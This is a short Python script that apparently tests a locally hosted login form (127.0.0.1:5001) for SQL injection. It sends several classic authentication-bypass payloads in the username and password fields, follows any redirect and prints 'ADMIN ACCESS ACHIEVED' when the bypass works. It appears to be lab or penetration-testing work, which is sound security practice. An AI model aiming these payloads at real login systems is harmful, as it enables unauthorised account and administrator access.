#!/usr/bin/env python3
import requests
import json

# Test SQL injection payloads
base_url = "http://127.0.0.1:5001"

# Test payloads
payloads = [
    {"username": "admin' OR '1'='1' --", "password": "anything"},
    {"username": "admin' OR 1=1 --", "password": "test"},
    {"username": "' OR '1'='1' --", "password": "test"},
    {"username": "admin", "password": "' OR '1'='1' --"},
    {"username": "admin'/*", "password": "*/OR/*", "comment": "*/1=1--"},
]

print("🔍 Testing SQL Injection on Login Form")
print("=" * 50)

# First, get a session
session = requests.Session()

for i, payload in enumerate(payloads, 1):
    print(f"\n📝 Test {i}: Username: {payload['username']}")
    print(f"           Password: {payload['password']}")
    
    # Make the POST request
    try:
        response = session.post(
            f"{base_url}/login",
            data=payload,
            allow_redirects=False
        )
        
        print(f"🔗 Status Code: {response.status_code}")
        print(f"🔗 Headers: {dict(response.headers)}")
        
        # Check for redirects (successful login)
        if response.status_code == 302:
            location = response.headers.get('Location', 'No location header')
            print(f"✅ REDIRECT to: {location}")
            print("🎯 SQL Injection SUCCESS! - Login bypassed")
            
            # Follow redirect to see where we land
            follow_response = session.get(f"{base_url}{location}")
            if 'admin' in follow_response.text.lower() or 'dashboard' in follow_response.text.lower():
                print("🏆 ADMIN ACCESS ACHIEVED!")
            
        elif response.status_code == 200:
            # Check response content for debug info
            if 'debug_query' in response.text or 'SQL' in response.text:
                print("🔍 Debug info found in response")
            if 'Authentication Error' in response.text:
                print("❌ Authentication failed")
            if 'Invalid' in response.text:
                print("❌ Invalid credentials message")
                
        print(f"📄 Response length: {len(response.text)} characters")
        
    except requests.exceptions.ConnectionError:
        print("❌ Connection error - is the server running?")
        break
    except Exception as e:
        print(f"❌ Error: {e}")

print("\n" + "=" * 50)
print("🔍 Test Complete")
